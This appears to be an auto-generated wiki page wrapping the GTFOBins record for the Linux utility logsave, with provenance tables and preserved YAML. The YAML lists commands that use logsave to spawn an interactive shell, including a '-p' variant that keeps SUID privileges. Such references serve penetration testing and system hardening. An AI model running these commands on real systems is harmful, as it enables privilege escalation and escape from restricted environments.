---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# logsave

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `logsave` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/logsave` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [logsave](../../tools/linux/logsave.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | logsave |
| name | logsave |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/logsave/ |

## Preserved Source Material

```yaml
_body: ''
_name: logsave
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/logsave
functions:
  shell:
  - code: logsave /dev/null /bin/sh -i
    contexts:
      sudo: null
      suid:
        code: logsave /dev/null /bin/sh -i -p
        shell: false
      unprivileged: null
```
